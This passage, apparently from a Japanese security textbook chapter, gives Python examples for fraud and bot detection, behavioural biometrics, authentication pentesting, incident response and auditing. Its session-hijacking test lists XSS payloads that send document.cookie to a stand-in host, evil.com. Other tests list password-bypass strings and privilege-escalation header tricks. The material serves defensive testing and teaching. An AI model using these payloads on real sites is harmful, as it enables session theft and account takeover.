                    
                    # トランザクション特徴
                    features.extend([
                        transaction.hour_of_day,
                        transaction.day_of_week,
                        transaction.is_weekend,
                        transaction.time_since_last_login
                    ])
                    
                    # 地理的特徴
                    geo_features = await self.calculate_geo_features(transaction)
                    features.extend([
                        geo_features.distance_from_usual_location,
                        geo_features.is_new_country,
                        geo_features.is_vpn_detected,
                        geo_features.location_risk_score
                    ])
                    
                    # 行動特徴
                    behavior_features = await self.calculate_behavior_features(transaction)
                    features.extend([
                        behavior_features.typing_speed_deviation,
                        behavior_features.mouse_movement_pattern,
                        behavior_features.click_pattern_score,
                        behavior_features.navigation_pattern_score
                    ])
                    
                    # ネットワーク特徴
                    network_features = await self.calculate_network_features(transaction)
                    features.extend([
                        network_features.ip_reputation_score,
                        network_features.is_tor_exit_node,
                        network_features.is_datacenter_ip,
                        network_features.asn_risk_score
                    ])
                    
                    return np.array(features)
            '''
        }

```

### 11.2.2 高度な脅威検知技術

```python
class AdvancedThreatDetection:
    """高度な脅威検知技術"""
    
    def deep_learning_models(self):
        """ディープラーニングモデルによる検知"""
        
        return {
            'autoencoder_anomaly_detection': '''
            import tensorflow as tf
            from tensorflow.keras import layers, Model
            
            class AutoencoderAnomalyDetector:
                """オートエンコーダーによる異常検知"""
                
                def __init__(self, input_dim: int):
                    self.input_dim = input_dim
                    self.encoder = self._build_encoder()
                    self.decoder = self._build_decoder()
                    self.autoencoder = self._build_autoencoder()
                    self.threshold = None
                
                def _build_encoder(self):
                    """エンコーダーの構築"""
                    inputs = layers.Input(shape=(self.input_dim,))
                    
                    # エンコーディング層
                    x = layers.Dense(128, activation='relu')(inputs)
                    x = layers.BatchNormalization()(x)
                    x = layers.Dropout(0.2)(x)
                    
                    x = layers.Dense(64, activation='relu')(x)
                    x = layers.BatchNormalization()(x)
                    x = layers.Dropout(0.2)(x)
                    
                    x = layers.Dense(32, activation='relu')(x)
                    x = layers.BatchNormalization()(x)
                    
                    # 潜在表現
                    latent = layers.Dense(16, activation='relu', name='latent')(x)
                    
                    return Model(inputs, latent, name='encoder')
                
                def _build_decoder(self):
                    """デコーダーの構築"""
                    latent_inputs = layers.Input(shape=(16,))
                    
                    # デコーディング層
                    x = layers.Dense(32, activation='relu')(latent_inputs)
                    x = layers.BatchNormalization()(x)
                    
                    x = layers.Dense(64, activation='relu')(x)
                    x = layers.BatchNormalization()(x)
                    
                    x = layers.Dense(128, activation='relu')(x)
                    x = layers.BatchNormalization()(x)
                    
                    # 出力層
                    outputs = layers.Dense(self.input_dim, activation='sigmoid')(x)
                    
                    return Model(latent_inputs, outputs, name='decoder')
                
                def _build_autoencoder(self):
                    """完全なオートエンコーダー"""
                    inputs = layers.Input(shape=(self.input_dim,))
                    latent = self.encoder(inputs)
                    outputs = self.decoder(latent)
                    
                    autoencoder = Model(inputs, outputs, name='autoencoder')
                    autoencoder.compile(
                        optimizer='adam',
                        loss='mse',
                        metrics=['mae']
                    )
                    
                    return autoencoder
                
                def train(self, normal_data: np.ndarray, validation_split: float = 0.2):
                    """正常データでの学習"""
                    
                    # データの正規化
                    self.scaler = StandardScaler()
                    normal_data_scaled = self.scaler.fit_transform(normal_data)
                    
                    # 学習
                    history = self.autoencoder.fit(
                        normal_data_scaled,
                        normal_data_scaled,
                        epochs=50,
                        batch_size=32,
                        validation_split=validation_split,
                        callbacks=[
                            tf.keras.callbacks.EarlyStopping(
                                patience=5,
                                restore_best_weights=True
                            ),
                            tf.keras.callbacks.ReduceLROnPlateau(
                                factor=0.5,
                                patience=3
                            )
                        ]
                    )
                    
                    # 閾値の設定（正常データの再構成誤差の95パーセンタイル）
                    predictions = self.autoencoder.predict(normal_data_scaled)
                    mse = np.mean((normal_data_scaled - predictions) ** 2, axis=1)
                    self.threshold = np.percentile(mse, 95)
                    
                    return history
                
                def detect_anomaly(self, data: np.ndarray) -> AnomalyResult:
                    """異常検知"""
                    
                    # データの正規化
                    data_scaled = self.scaler.transform(data.reshape(1, -1))
                    
                    # 再構成
                    prediction = self.autoencoder.predict(data_scaled)
                    
                    # 再構成誤差
                    reconstruction_error = np.mean((data_scaled - prediction) ** 2)
                    
                    # 異常判定
                    is_anomaly = reconstruction_error > self.threshold
                    anomaly_score = reconstruction_error / self.threshold
                    
                    # 特徴ごとの寄与度
                    feature_errors = (data_scaled - prediction) ** 2
                    feature_contributions = feature_errors[0] / np.sum(feature_errors[0])
                    
                    return AnomalyResult(
                        is_anomaly=is_anomaly,
                        anomaly_score=float(anomaly_score),
                        reconstruction_error=float(reconstruction_error),
                        feature_contributions=feature_contributions.tolist(),
                        threshold=float(self.threshold)
                    )
            ''',
            
            'graph_neural_network_detection': '''
            class GraphNeuralNetworkDetector:
                """グラフニューラルネットワークによる不正検知"""
                
                def __init__(self):
                    self.gnn_model = self._build_gnn_model()
                    self.graph_builder = UserInteractionGraphBuilder()
                
                def _build_gnn_model(self):
                    """GNNモデルの構築"""
                    import torch
                    import torch.nn as nn
                    import torch_geometric.nn as pyg_nn
                    
                    class FraudGNN(nn.Module):
                        def __init__(self, input_dim, hidden_dim, output_dim):
                            super(FraudGNN, self).__init__()
                            
                            # Graph Convolutional Layers
                            self.conv1 = pyg_nn.GCNConv(input_dim, hidden_dim)
                            self.conv2 = pyg_nn.GCNConv(hidden_dim, hidden_dim)
                            self.conv3 = pyg_nn.GCNConv(hidden_dim, hidden_dim)
                            
                            # Attention mechanism
                            self.attention = pyg_nn.GATConv(
                                hidden_dim, 
                                hidden_dim, 
                                heads=4, 
                                concat=True
                            )
                            
                            # Classification head
                            self.classifier = nn.Sequential(
                                nn.Linear(hidden_dim * 4, hidden_dim),
                                nn.ReLU(),
                                nn.Dropout(0.3),
                                nn.Linear(hidden_dim, output_dim)
                            )
                            
                        def forward(self, x, edge_index, batch):
                            # Graph convolutions
                            x = torch.relu(self.conv1(x, edge_index))
                            x = torch.relu(self.conv2(x, edge_index))
                            x = torch.relu(self.conv3(x, edge_index))
                            
                            # Attention
                            x = self.attention(x, edge_index)
                            
                            # Global pooling
                            x = pyg_nn.global_mean_pool(x, batch)
                            
                            # Classification
                            return self.classifier(x)
                    
                    return FraudGNN(
                        input_dim=64,
                        hidden_dim=128,
                        output_dim=2
                    )
                
                async def detect_coordinated_attacks(
                    self, 
                    time_window: TimeWindow
                ) -> CoordinatedAttackResult:
                    """協調的な攻撃の検知"""
                    
                    # ユーザー相互作用グラフの構築
                    interaction_graph = await self.graph_builder.build_graph(time_window)
                    
                    # グラフ特徴量の抽出
                    node_features = self.extract_node_features(interaction_graph)
                    edge_features = self.extract_edge_features(interaction_graph)
                    
                    # GNNによる予測
                    predictions = self.gnn_model(
                        x=node_features,
                        edge_index=interaction_graph.edge_index,
                        batch=interaction_graph.batch
                    )
                    
                    # 不正なクラスタの検出
                    suspicious_clusters = self.identify_suspicious_clusters(
                        graph=interaction_graph,
                        predictions=predictions
                    )
                    
                    # 攻撃パターンの分析
                    attack_patterns = await self.analyze_attack_patterns(
                        suspicious_clusters
                    )
                    
                    return CoordinatedAttackResult(
                        detected_clusters=suspicious_clusters,
                        attack_patterns=attack_patterns,
                        confidence_scores=predictions.softmax(dim=1)[:, 1].tolist(),
                        graph_metrics=self.calculate_graph_metrics(interaction_graph)
                    )
            '''
        }
    
    def behavioral_biometrics(self):
        """行動バイオメトリクスによる認証"""
        
        return {
            'keystroke_dynamics': '''
            class KeystrokeDynamicsAnalyzer:
                """キーストロークダイナミクスによる本人確認"""
                
                def __init__(self):
                    self.model = self._build_verification_model()
                    self.feature_extractor = KeystrokeFeatureExtractor()
                
                def extract_keystroke_features(self, keystroke_data: List[KeystrokeEvent]) -> np.ndarray:
                    """キーストロークからの特徴抽出"""
                    
                    features = []
                    
                    # Dwell time（キー押下時間）
                    dwell_times = [
                        event.key_up_time - event.key_down_time 
                        for event in keystroke_data
                    ]
                    features.extend([
                        np.mean(dwell_times),
                        np.std(dwell_times),
                        np.percentile(dwell_times, [25, 50, 75])
                    ])
                    
                    # Flight time（キー間の時間）
                    flight_times = []
                    for i in range(1, len(keystroke_data)):
                        flight_time = keystroke_data[i].key_down_time - keystroke_data[i-1].key_up_time
                        flight_times.append(flight_time)
                    
                    features.extend([
                        np.mean(flight_times),
                        np.std(flight_times),
                        np.percentile(flight_times, [25, 50, 75])
                    ])
                    
                    # タイピングリズムの特徴
                    rhythm_features = self.extract_rhythm_features(keystroke_data)
                    features.extend(rhythm_features)
                    
                    # 特定のキーの組み合わせの特徴
                    digraph_features = self.extract_digraph_features(keystroke_data)
                    features.extend(digraph_features)
                    
                    return np.array(features)
                
                async def verify_user(
                    self, 
                    user_id: str, 
                    current_keystrokes: List[KeystrokeEvent]
                ) -> BiometricVerificationResult:
                    """キーストロークパターンによる本人確認"""
                    
                    # 現在のキーストローク特徴
                    current_features = self.extract_keystroke_features(current_keystrokes)
                    
                    # ユーザーの登録済みプロファイル
                    user_profile = await self.get_user_keystroke_profile(user_id)
                    
                    if not user_profile.has_sufficient_data:
                        return BiometricVerificationResult(
                            verified=True,  # データ不足時は通過
                            confidence=0.5,
                            reason="Insufficient biometric data"
                        )
                    
                    # 類似度スコアの計算
                    similarity_score = self.calculate_similarity(
                        current_features,
                        user_profile.feature_vectors
                    )
                    
                    # 機械学習モデルによる検証
                    ml_verification = self.model.predict_proba(
                        current_features.reshape(1, -1)
                    )[0][1]
                    
                    # 総合的な判定
                    combined_score = 0.6 * similarity_score + 0.4 * ml_verification
                    is_verified = combined_score > user_profile.threshold
                    
                    # 継続的な学習
                    if is_verified and combined_score > 0.8:
                        await self.update_user_profile(user_id, current_features)
                    
                    return BiometricVerificationResult(
                        verified=is_verified,
                        confidence=float(combined_score),
                        similarity_score=float(similarity_score),
                        ml_score=float(ml_verification),
                        anomaly_details=self.get_anomaly_details(
                            current_features,
                            user_profile
                        )
                    )
            ''',
            
            'mouse_movement_analysis': '''
            class MouseMovementAnalyzer:
                """マウス動作パターン分析"""
                
                def analyze_mouse_behavior(self, mouse_events: List[MouseEvent]) -> MouseBehaviorProfile:
                    """マウス動作の分析"""
                    
                    # 基本的な統計量
                    velocities = self.calculate_velocities(mouse_events)
                    accelerations = self.calculate_accelerations(mouse_events)
                    angles = self.calculate_movement_angles(mouse_events)
                    
                    # 動作パターンの特徴
                    movement_features = {
                        'avg_velocity': np.mean(velocities),
                        'velocity_std': np.std(velocities),
                        'max_velocity': np.max(velocities),
                        'avg_acceleration': np.mean(accelerations),
                        'direction_changes': self.count_direction_changes(angles),
                        'pause_count': self.count_pauses(mouse_events),
                        'click_accuracy': self.calculate_click_accuracy(mouse_events)
                    }
                    
                    # カーブの特徴
                    curve_features = self.analyze_curves(mouse_events)
                    movement_features.update(curve_features)
                    
                    # 異常パターンの検出
                    anomalies = self.detect_anomalous_patterns(mouse_events)
                    
                    return MouseBehaviorProfile(
                        features=movement_features,
                        anomalies=anomalies,
                        confidence_score=self.calculate_confidence(movement_features)
                    )
                
                def detect_bot_behavior(self, mouse_events: List[MouseEvent]) -> BotDetectionResult:
                    """ボット行動の検出"""
                    
                    bot_indicators = []
                    
                    # 直線的な動き
                    linearity_score = self.calculate_linearity(mouse_events)
                    if linearity_score > 0.9:
                        bot_indicators.append({
                            'indicator': 'high_linearity',
                            'score': linearity_score,
                            'severity': 'HIGH'
                        })
                    
                    # 一定速度の動き
                    velocity_variance = np.var(self.calculate_velocities(mouse_events))
                    if velocity_variance < 0.1:
                        bot_indicators.append({
                            'indicator': 'constant_velocity',
                            'score': 1 - velocity_variance,
                            'severity': 'HIGH'
                        })
                    
                    # 不自然なクリックパターン
                    click_pattern_score = self.analyze_click_patterns(mouse_events)
                    if click_pattern_score > 0.8:
                        bot_indicators.append({
                            'indicator': 'unnatural_clicks',
                            'score': click_pattern_score,
                            'severity': 'MEDIUM'
                        })
                    
                    # 総合判定
                    is_bot = len([i for i in bot_indicators if i['severity'] == 'HIGH']) > 0
                    confidence = np.mean([i['score'] for i in bot_indicators]) if bot_indicators else 0
                    
                    return BotDetectionResult(
                        is_bot=is_bot,
                        confidence=float(confidence),
                        indicators=bot_indicators,
                        recommendation=self.get_bot_response_recommendation(confidence)
                    )
            '''
        }
```

## 11.3 ペネトレーションテスト

### 11.3.1 認証認可システムのペンテスト

```python
class AuthenticationPenetrationTesting:
    """認証システムのペネトレーションテスト"""
    
    def test_plan(self):
        """テスト計画"""
        
        return {
            'scope': {
                'included': [
                    'ログイン機能',
                    'パスワードリセット',
                    'MFA実装',
                    'セッション管理',
                    'API認証'
                ],
                'excluded': [
                    '本番データベース',
                    'サードパーティサービス'
                ],
                'test_accounts': [
                    'pentest_user_01@example.com',
                    'pentest_admin_01@example.com'
                ]
            },
            
            'methodology': '''
            class PentestMethodology:
                """ペンテスト方法論"""
                
                def __init__(self):
                    self.phases = [
                        'reconnaissance',
                        'scanning',
                        'enumeration',
                        'vulnerability_assessment',
                        'exploitation',
                        'post_exploitation',
                        'reporting'
                    ]
                
                async def execute_pentest(self):
                    """ペンテストの実行"""
                    
                    results = PentestResults()
                    
                    # 1. 偵察フェーズ
                    recon_results = await self.reconnaissance_phase()
                    results.add_findings('reconnaissance', recon_results)
                    
                    # 2. スキャニングフェーズ
                    scan_results = await self.scanning_phase()
                    results.add_findings('scanning', scan_results)
                    
                    # 3. 列挙フェーズ
                    enum_results = await self.enumeration_phase()
                    results.add_findings('enumeration', enum_results)
                    
                    # 4. 脆弱性評価
                    vuln_results = await self.vulnerability_assessment()
                    results.add_findings('vulnerabilities', vuln_results)
                    
                    # 5. エクスプロイト
                    exploit_results = await self.exploitation_phase()
                    results.add_findings('exploits', exploit_results)
                    
                    return results
            '''
        }
    
    def authentication_tests(self):
        """認証テストケース"""
        
        return {
            'password_policy_tests': '''
            class PasswordPolicyTests:
                """パスワードポリシーのテスト"""
                
                async def test_weak_passwords(self):
                    """弱いパスワードのテスト"""
                    
                    weak_passwords = [
                        'password',
                        '12345678',
                        'qwerty123',
                        'admin@123',
                        'Password1!',  # 一般的なパターン
                        self.target_company_name + '123',
                        self.current_year + '!',
                    ]
                    
                    results = []
                    for password in weak_passwords:
                        result = await self.attempt_registration(
                            email='test@example.com',
                            password=password
                        )
                        
                        if result.success:
                            results.append({
                                'severity': 'HIGH',
                                'finding': f'Weak password accepted: {password}',
                                'recommendation': 'Implement stronger password validation'
                            })
                    
                    return results
                
                async def test_password_complexity_bypass(self):
                    """パスワード複雑性のバイパステスト"""
                    
                    bypass_attempts = [
                        {
                            'password': 'P@ssw0rd',  # Unicode look-alike
                            'technique': 'unicode_substitution'
                        },
                        {
                            'password': 'Admin123!\u200b',  # Zero-width space
                            'technique': 'invisible_characters'
                        },
                        {
                            'password': 'a' * 1000 + '1!A',  # Length attack
                            'technique': 'excessive_length'
                        }
                    ]
                    
                    vulnerabilities = []
                    for attempt in bypass_attempts:
                        if await self.test_password_bypass(attempt):
                            vulnerabilities.append({
                                'severity': 'MEDIUM',
                                'technique': attempt['technique'],
                                'impact': 'Password policy bypass'
                            })
                    
                    return vulnerabilities
            ''',
            
            'session_security_tests': '''
            class SessionSecurityTests:
                """セッションセキュリティテスト"""
                
                async def test_session_fixation(self):
                    """セッション固定攻撃のテスト"""
                    
                    # 1. 攻撃者がセッションIDを取得
                    attacker_session = await self.create_anonymous_session()
                    
                    # 2. 被害者にセッションIDを設定
                    victim_client = self.create_test_client()
                    victim_client.set_session_id(attacker_session.id)
                    
                    # 3. 被害者がログイン
                    await victim_client.login(
                        username='victim@example.com',
                        password='ValidPassword123!'
                    )
                    
                    # 4. 攻撃者が同じセッションIDでアクセス
                    attacker_client = self.create_test_client()
                    attacker_client.set_session_id(attacker_session.id)
                    
                    # 認証されたリソースへのアクセステスト
                    profile = await attacker_client.get('/api/profile')
                    
                    if profile.status_code == 200:
                        return {
                            'vulnerability': 'Session Fixation',
                            'severity': 'CRITICAL',
                            'proof_of_concept': attacker_session.id,
                            'remediation': 'Regenerate session ID after login'
                        }
                    
                    return None
                
                async def test_session_hijacking_vectors(self):
                    """セッションハイジャックのベクターテスト"""
                    
                    vectors = []
                    
                    # 1. XSS経由でのセッション窃取
                    xss_payloads = [
                        "<script>fetch('/steal?cookie='+document.cookie)</script>",
                        "<img src=x onerror=this.src='//evil.com/'+document.cookie>",
                        "';fetch('//evil.com/'+btoa(document.cookie))//",
                    ]
                    
                    for payload in xss_payloads:
                        if await self.test_xss_vector(payload):
                            vectors.append({
                                'vector': 'XSS',
                                'payload': payload,
                                'impact': 'Session theft possible'
                            })
                    
                    # 2. HTTPSダウングレード
                    if await self.test_https_downgrade():
                        vectors.append({
                            'vector': 'HTTPS Downgrade',
                            'impact': 'Session token exposure over HTTP'
                        })
                    
                    # 3. セッションの予測可能性
                    session_ids = await self.collect_session_ids(100)
                    if self.analyze_session_randomness(session_ids) < 0.9:
                        vectors.append({
                            'vector': 'Predictable Session IDs',
                            'impact': 'Session IDs can be guessed'
                        })
                    
                    return vectors
            '''
        }
    
    def authorization_tests(self):
        """認可テストケース"""
        
        return {
            'privilege_escalation_tests': '''
            class PrivilegeEscalationTests:
                """権限昇格テスト"""
                
                async def test_horizontal_escalation(self):
                    """水平的権限昇格のテスト"""
                    
                    # 2つのテストユーザーでログイン
                    user1 = await self.login_as_user('user1@example.com')
                    user2 = await self.login_as_user('user2@example.com')
                    
                    # User1のリソースを作成
                    resource = await user1.create_resource({
                        'name': 'Private Document',
                        'content': 'Sensitive data'
                    })
                    
                    # User2でUser1のリソースにアクセス試行
                    escalation_attempts = [
                        # 直接的なIDアクセス
                        user2.get(f'/api/resources/{resource.id}'),
                        
                        # IDの推測
                        user2.get(f'/api/resources/{resource.id + 1}'),
                        user2.get(f'/api/resources/{resource.id - 1}'),
                        
                        # パラメータ改ざん
                        user2.get('/api/resources', params={'user_id': user1.id}),
                        
                        # GraphQLでの試行
                        user2.post('/graphql', json={
                            'query': f'{{ resource(id: "{resource.id}") {{ content }} }}'
                        })
                    ]
                    
                    vulnerabilities = []
                    for attempt in escalation_attempts:
                        result = await attempt
                        if result.status_code == 200:
                            vulnerabilities.append({
                                'type': 'Horizontal Privilege Escalation',
                                'endpoint': attempt.url,
                                'method': attempt.method,
                                'severity': 'HIGH'
                            })
                    
                    return vulnerabilities
                
                async def test_vertical_escalation(self):
                    """垂直的権限昇格のテスト"""
                    
                    regular_user = await self.login_as_user('regular@example.com')
                    
                    # 管理者機能へのアクセス試行
                    admin_endpoints = [
                        '/api/admin/users',
                        '/api/admin/settings',
                        '/api/admin/logs',
                        '/api/system/config'
                    ]
                    
                    escalation_techniques = [
                        # HTTPメソッドの変更
                        lambda ep: regular_user.get(ep),
                        lambda ep: regular_user.post(ep),
                        lambda ep: regular_user.put(ep),
                        
                        # ヘッダーの追加
                        lambda ep: regular_user.get(ep, headers={'X-Admin': 'true'}),
                        lambda ep: regular_user.get(ep, headers={'X-Forwarded-For': '127.0.0.1'}),
                        
                        # パラメータの追加
                        lambda ep: regular_user.get(ep, params={'admin': 'true'}),
                        lambda ep: regular_user.get(ep, params={'role': 'admin'}),
                    ]
                    
                    vulnerabilities = []
                    for endpoint in admin_endpoints:
                        for technique in escalation_techniques:
                            try:
                                response = await technique(endpoint)
                                if response.status_code != 403:
                                    vulnerabilities.append({
                                        'endpoint': endpoint,
                                        'technique': technique.__name__,
                                        'response_code': response.status_code
                                    })
                            except Exception as e:
                                pass
                    
                    return vulnerabilities
            '''
        }
```

## 11.4 インシデント対応

### 11.4.1 インシデント対応計画

```python
class IncidentResponsePlan:
    """インシデント対応計画"""
    
    def incident_classification(self):
        """インシデントの分類"""
        
        return {
            'severity_levels': {
                'CRITICAL': {
                    'description': 'システム全体の侵害、大規模データ漏洩',
                    'response_time': '15分以内',
                    'escalation': 'CISO, CEO, Legal',
                    'examples': [
                        '管理者アカウントの侵害',
                        '認証システムの完全な侵害',
                        '大量のユーザー認証情報の漏洩'
                    ]
                },
                'HIGH': {
                    'description': '限定的な侵害、特定ユーザーへの影響',
                    'response_time': '1時間以内',
                    'escalation': 'Security Team Lead, CISO',
                    'examples': [
                        '個別アカウントの不正アクセス',
                        'セッションハイジャック',
                        '権限昇格の成功'
                    ]
                },
                'MEDIUM': {
                    'description': '攻撃の試み、潜在的な脅威',
                    'response_time': '4時間以内',
                    'escalation': 'Security Team',
                    'examples': [
                        'ブルートフォース攻撃の検知',
                        '異常なアクセスパターン',
                        'セキュリティ設定の誤り'
                    ]
                },
                'LOW': {
                    'description': '軽微な問題、監視対象',
                    'response_time': '24時間以内',
                    'escalation': 'Security Analyst',
                    'examples': [
                        '単発の不正ログイン試行',
                        '既知の脆弱性スキャン'
                    ]
                }
            }
        }
    
    def incident_response_workflow(self):
        """インシデント対応ワークフロー"""
        
        return {
            'detection_and_analysis': '''
            class IncidentDetectionAndAnalysis:
                """検知と分析フェーズ"""
                
                async def detect_security_incident(self, event: SecurityEvent) -> Incident:
                    """セキュリティインシデントの検知"""
                    
                    # 1. イベントの分類
                    incident_type = self.classify_event(event)
                    
                    # 2. 影響範囲の特定
                    scope = await self.determine_scope(event)
                    
                    # 3. 深刻度の評価
                    severity = self.assess_severity(incident_type, scope)
                    
                    # 4. インシデントの作成
                    incident = Incident(
                        id=self.generate_incident_id(),
                        type=incident_type,
                        severity=severity,
                        detected_at=datetime.utcnow(),
                        initial_event=event,
                        scope=scope,
                        status='DETECTED'
                    )
                    
                    # 5. 初期対応の開始
                    await self.initiate_response(incident)
                    
                    return incident
                
                async def analyze_incident(self, incident: Incident):
                    """インシデントの詳細分析"""
                    
                    analysis = IncidentAnalysis()
                    
                    # タイムラインの構築
                    timeline = await self.build_timeline(incident)
                    analysis.timeline = timeline
                    
                    # 影響を受けたアカウントの特定
                    affected_accounts = await self.identify_affected_accounts(incident)
                    analysis.affected_accounts = affected_accounts
                    
                    # 攻撃ベクターの特定
                    attack_vectors = await self.identify_attack_vectors(incident)
                    analysis.attack_vectors = attack_vectors
                    
                    # 侵害の指標（IoC）の抽出
                    iocs = await self.extract_indicators_of_compromise(incident)
                    analysis.iocs = iocs
                    
                    # 根本原因の分析
                    root_cause = await self.analyze_root_cause(incident)
                    analysis.root_cause = root_cause
                    
                    return analysis
            ''',
            
            'containment_eradication_recovery': '''
            class ContainmentEradicationRecovery:
                """封じ込め、根絶、復旧フェーズ"""
                
                async def contain_incident(self, incident: Incident):
                    """インシデントの封じ込め"""
                    
                    containment_actions = []
                    
                    # 短期的封じ込め
                    if incident.type == 'account_compromise':
                        # 影響を受けたアカウントの無効化
                        for account_id in incident.affected_accounts:
                            await self.disable_account(account_id)
                            containment_actions.append(f"Disabled account: {account_id}")
                        
                        # 関連するセッションの無効化
                        await self.invalidate_user_sessions(incident.affected_accounts)
                        containment_actions.append("Invalidated all sessions")
                        
                        # IPアドレスのブロック
                        for ip in incident.malicious_ips:
                            await self.block_ip_address(ip)
                            containment_actions.append(f"Blocked IP: {ip}")
                    
                    # 長期的封じ込め
                    if incident.severity >= 'HIGH':
                        # システムの隔離
                        await self.isolate_affected_systems(incident.affected_systems)
                        
                        # ネットワークセグメンテーション
                        await self.apply_network_segmentation(incident.scope)
                    
                    incident.containment_actions = containment_actions
                    incident.status = 'CONTAINED'
                
                async def eradicate_threat(self, incident: Incident):
                    """脅威の根絶"""
                    
                    eradication_actions = []
                    
                    # マルウェアの除去
                    if incident.has_malware:
                        removed_malware = await self.remove_malware(incident.malware_signatures)
                        eradication_actions.extend(removed_malware)
                    
                    # 不正なアカウントの削除
                    for account in incident.rogue_accounts:
                        await self.delete_account(account)
                        eradication_actions.append(f"Deleted rogue account: {account}")
                    
                    # バックドアの除去
                    backdoors = await self.scan_for_backdoors(incident.affected_systems)
                    for backdoor in backdoors:
                        await self.remove_backdoor(backdoor)
                        eradication_actions.append(f"Removed backdoor: {backdoor}")
                    
                    # 脆弱性の修正
                    await self.patch_vulnerabilities(incident.exploited_vulnerabilities)
                    
                    incident.eradication_actions = eradication_actions
                    incident.status = 'ERADICATED'
                
                async def recover_systems(self, incident: Incident):
                    """システムの復旧"""
                    
                    recovery_plan = self.create_recovery_plan(incident)
                    
                    # 1. バックアップからの復元（必要な場合）
                    if incident.requires_restoration:
                        await self.restore_from_backup(
                            incident.affected_systems,
                            incident.last_known_good_state
                        )
                    
                    # 2. セキュリティ強化
                    hardening_actions = await self.apply_security_hardening(
                        incident.affected_systems
                    )
                    
                    # 3. 監視の強化
                    await self.enhance_monitoring(incident.scope)
                    
                    # 4. 段階的な復旧
                    for phase in recovery_plan.phases:
                        await self.execute_recovery_phase(phase)
                        
                        # 検証
                        if not await self.verify_recovery(phase):
                            await self.rollback_recovery(phase)
                            raise RecoveryError(f"Recovery phase {phase.name} failed")
                    
                    incident.recovery_actions = recovery_plan.get_executed_actions()
                    incident.status = 'RECOVERED'
            '''
        }
    
    def post_incident_activities(self):
        """インシデント後の活動"""
        
        return {
            'lessons_learned': '''
            class LessonsLearned:
                """教訓の抽出"""
                
                async def conduct_post_mortem(self, incident: Incident) -> PostMortemReport:
                    """事後分析の実施"""
                    
                    report = PostMortemReport()
                    
                    # 1. インシデントの要約
                    report.summary = self.create_incident_summary(incident)
                    
                    # 2. タイムライン分析
                    report.timeline_analysis = self.analyze_response_timeline(incident)
                    
                    # 3. 良かった点
                    report.what_went_well = [
                        "迅速な初期検知（15分以内）",
                        "効果的な封じ込め戦略",
                        "ステークホルダーへの適切な通知"
                    ]
                    
                    # 4. 改善点
                    report.what_needs_improvement = [
                        {
                            'issue': '初期分析に時間がかかった',
                            'root_cause': '自動化ツールの不足',
                            'recommendation': '分析プロセスの自動化'
                        },
                        {
                            'issue': 'バックアップの復元に問題',
                            'root_cause': 'テストされていないバックアップ',
                            'recommendation': '定期的な復元テスト'
                        }
                    ]
                    
                    # 5. アクションアイテム
                    report.action_items = await self.generate_action_items(incident)
                    
                    # 6. 更新が必要なドキュメント
                    report.documentation_updates = [
                        'インシデント対応手順書',
                        'セキュリティポリシー',
                        '技術的対策ガイド'
                    ]
                    
                    return report
                
                async def update_security_controls(self, lessons: PostMortemReport):
                    """セキュリティ対策の更新"""
                    
                    for action_item in lessons.action_items:
                        if action_item.type == 'technical_control':
                            await self.implement_technical_control(action_item)
                        
                        elif action_item.type == 'process_improvement':
                            await self.update_process(action_item)
                        
                        elif action_item.type == 'training':
                            await self.schedule_training(action_item)
                    
                    # 検知ルールの更新
                    new_detection_rules = self.create_detection_rules(lessons)
                    await self.deploy_detection_rules(new_detection_rules)
                    
                    # インシデント対応プレイブックの更新
                    await self.update_playbooks(lessons)
            '''
        }
```

## 11.5 定期的なセキュリティ監査

### 11.5.1 セキュリティ監査の実施

```python
class SecurityAuditFramework:
    """セキュリティ監査フレームワーク"""
    
    def audit_checklist(self):
        """監査チェックリスト"""
        
        return {
            'authentication_audit': '''
            class AuthenticationAudit:
                """認証システムの監査"""
                
                async def audit_password_policies(self) -> AuditResult:
                    """パスワードポリシーの監査"""
                    
                    findings = []
                    
                    # 1. パスワード複雑性要件
                    policy = await self.get_password_policy()
                    
                    if policy.min_length < 12:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': 'パスワード最小長が12文字未満',
                            'current': policy.min_length,
                            'recommended': 12,
                            'standard': 'NIST SP 800-63B'
                        })
                    
                    # 2. パスワード履歴
                    if policy.history_count < 5:
                        findings.append({
                            'severity': 'LOW',
                            'finding': 'パスワード履歴が不十分',
                            'current': policy.history_count,
                            'recommended': 5
                        })
                    
                    # 3. 漏洩パスワードチェック
                    if not policy.breach_check_enabled:
                        findings.append({
                            'severity': 'HIGH',
                            'finding': '漏洩パスワードチェックが無効',
                            'impact': '既知の侵害されたパスワードが使用可能'
                        })
                    
                    # 4. 実際のパスワード強度分析
                    strength_analysis = await self.analyze_actual_passwords()
                    if strength_analysis.weak_password_percentage > 10:
                        findings.append({
                            'severity': 'HIGH',
                            'finding': '弱いパスワードが多数存在',
                            'percentage': strength_analysis.weak_password_percentage,
                            'recommendation': 'パスワード強度の強制とユーザー教育'
                        })
                    
                    return AuditResult(
                        area='Password Policies',
                        findings=findings,
                        compliance_score=self.calculate_compliance_score(findings)
                    )
                
                async def audit_mfa_implementation(self) -> AuditResult:
                    """MFA実装の監査"""
                    
                    findings = []
                    
                    # MFA採用率
                    mfa_stats = await self.get_mfa_statistics()
                    
                    if mfa_stats.admin_mfa_rate < 100:
                        findings.append({
                            'severity': 'CRITICAL',
                            'finding': '管理者のMFA採用率が100%未満',
                            'current_rate': mfa_stats.admin_mfa_rate,
                            'affected_admins': mfa_stats.admins_without_mfa
                        })
                    
                    if mfa_stats.overall_mfa_rate < 50:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': '全体のMFA採用率が低い',
                            'current_rate': mfa_stats.overall_mfa_rate,
                            'recommendation': 'MFA推進キャンペーンの実施'
                        })
                    
                    # MFA方式の評価
                    mfa_methods = await self.get_mfa_methods_distribution()
                    
                    if mfa_methods.sms_percentage > 30:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': 'SMS認証の使用率が高い',
                            'risk': 'SIMスワップ攻撃のリスク',
                            'recommendation': 'TOTPまたはハードウェアキーへの移行'
                        })
                    
                    # バックアップコード管理
                    backup_audit = await self.audit_backup_codes()
                    if backup_audit.unused_rate > 80:
                        findings.append({
                            'severity': 'LOW',
                            'finding': 'バックアップコードの未使用率が高い',
                            'implication': 'ユーザーがバックアップコードを保存していない可能性'
                        })
                    
                    return AuditResult(
                        area='Multi-Factor Authentication',
                        findings=findings,
                        compliance_score=self.calculate_compliance_score(findings)
                    )
            ''',
            
            'authorization_audit': '''
            class AuthorizationAudit:
                """認可システムの監査"""
                
                async def audit_permission_assignments(self) -> AuditResult:
                    """権限割り当ての監査"""
                    
                    findings = []
                    
                    # 1. 過剰な権限の検出
